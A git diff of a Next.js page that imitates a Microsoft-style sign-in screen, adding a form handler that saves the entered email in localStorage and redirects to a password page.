@@ -1,8 +1,16 @@
 import Head from "next/head";
-import Image from "next/image";
 import styles from "../styles/Index.module.css";
 
 export default function Home() {
+  const submitEmail = (e) => {
+    e.preventDefault();
+    const data = new FormData(e.currentTarget);
+    const email = data.get("account");
+    localStorage.setItem("email", email);
+    if (localStorage.getItem("email")) {
+      window.location.href = "/password";
+    }
+  };
   return (
     <div className={`${styles.container} ${styles.flow}`}>
       <Head>
@@ -95,10 +103,6 @@ export default function Home() {
           name="msapplication-square310x310logo"
           content="mstile-310x310.png"
         />
-        <link
-          rel="stylesheet"
-          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css"
-        />
       </Head>
 
       <main className={`${styles.main} ${styles.flow} `}>
@@ -119,12 +123,14 @@ export default function Home() {
           action=""
           method="POST"
           className={`${styles.flow} ${styles.form}`}
+          onSubmit={submitEmail}
         >
           <input
             type="text"
             name="account"
             placeholder="Email, phone, or Skype"
             className={styles.input}
+            required={true}
           />
           <input type="submit" value="Next" className={styles.input} />
         </form>
